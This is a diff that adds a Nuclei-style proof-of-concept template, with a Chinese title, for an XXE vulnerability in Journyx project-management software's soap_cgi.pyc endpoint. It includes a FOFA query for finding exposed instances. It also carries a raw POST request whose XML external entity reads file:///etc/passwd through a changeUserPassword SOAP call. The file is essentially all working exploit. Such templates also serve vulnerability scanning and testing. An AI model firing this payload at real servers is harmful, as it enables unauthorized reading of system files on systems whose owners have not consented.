@@ -1,0 +1,27 @@
+id: poc-wzcqgat76l4u37pt
+info:
+  name: Journyx项目管理软件 soap_cgi.pyc XXE漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/wzcqgat76l4u37pt'
+  tags: xxe,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: wzcqgat76l4u37pt
+    fofa: body="Journyx"
+http:
+- raw:
+  - 'POST /jtcgi/soap_cgi.pyc HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent:Mozilla/5.0 (WindowsNT10.0;Win64; x64) AppleWebKit/537.36 (KHTML, likeGecko)Chrome/96.0.4664.93Safari/537.36
+
+    Content-Type: application/xml
+
+    <?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Header/><soapenv:Body><changeUserPassword><username>&test;</username><curpwd>zzz</curpwd><newpwd>zzz123</newpwd></changeUserPassword></soapenv:Body></soapenv:Envelope>'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
